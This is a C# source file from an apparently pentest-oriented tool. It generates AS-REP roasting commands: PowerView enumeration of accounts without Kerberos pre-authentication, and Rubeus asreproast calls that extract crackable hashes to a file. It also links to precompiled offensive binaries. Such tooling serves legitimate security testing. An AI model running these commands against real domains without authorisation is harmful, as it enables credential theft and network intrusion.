using System.Collections.Generic;

namespace AD_Commander.Generators;

// Builds AS-REP roasting commands. PowerView only enumerates the roastable accounts
// (Get-DomainUser -PreauthNotRequired); Rubeus both finds and extracts the hashes.
// Pure text generation only.
public static class AsRepRoastGenerator
{
    public static string Generate(
        string tool,
        string identity,
        string properties,
        string outputFormat,
        bool verbose,
        string domain,
        string username,
        string password,
        bool secureMode)
    {
        return tool == "Rubeus"
            ? GenerateRubeus(identity, outputFormat, domain, username, password)
            : GeneratePowerView(identity, properties, verbose, domain, username, password, secureMode);
    }

    private static string GeneratePowerView(
        string identity, string properties, bool verbose, string domain, string username, string password, bool secureMode)
    {
        bool useCredential = domain.Length > 0 && username.Length > 0;
        List<string> lines = new List<string>();

        lines.Add("# PowerView (PowerSploit): https://github.com/PowerShellMafia/PowerSploit");
        lines.Add("");

        if (useCredential)
        {
            lines.AddRange(GeneratorHelpers.CredentialBlock(domain, username, password, secureMode));
        }

        lines.Add(GeneratorHelpers.PowerViewImport);
        lines.Add("");
        lines.Add("# Find accounts without Kerberos pre-auth. Switch Tool to Rubeus to also extract the hashes.");

        string command = "Get-DomainUser -PreauthNotRequired";
        if (identity.Length > 0)
        {
            command += $" -Identity '{GeneratorHelpers.EscapeSingleQuotes(identity)}'";
        }
        if (properties.Length > 0)
        {
            command += $" -Properties {properties}";
        }
        if (useCredential)
        {
            command += " -Credential $Cred";
        }
        if (verbose)
        {
            command += " -Verbose";
        }

        lines.Add(command);

        return string.Join("\r\n", lines);
    }

    private static string GenerateRubeus(
        string identity, string outputFormat, string domain, string username, string password)
    {
        bool useCredential = domain.Length > 0 && username.Length > 0 && password.Length > 0;
        List<string> lines = new List<string>();

        lines.Add("# Rubeus: https://github.com/GhostPack/Rubeus");
        lines.Add("# Precompiled binaries: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries");
        if (useCredential)
        {
            lines.Add("# NOTE: Rubeus has no secure prompt; /creds below holds the password in clear text.");
        }
        lines.Add("");

        string command = $"Rubeus.exe asreproast /format:{outputFormat.ToLowerInvariant()} /outfile:asrep.txt /nowrap";
        if (identity.Length > 0)
        {
            command += $" /user:{identity}";
        }
        if (useCredential)
        {
            command += $" /creds:{domain}\\{username}:{password}";
        }

        lines.Add(command);

        return string.Join("\r\n", lines);
    }
}
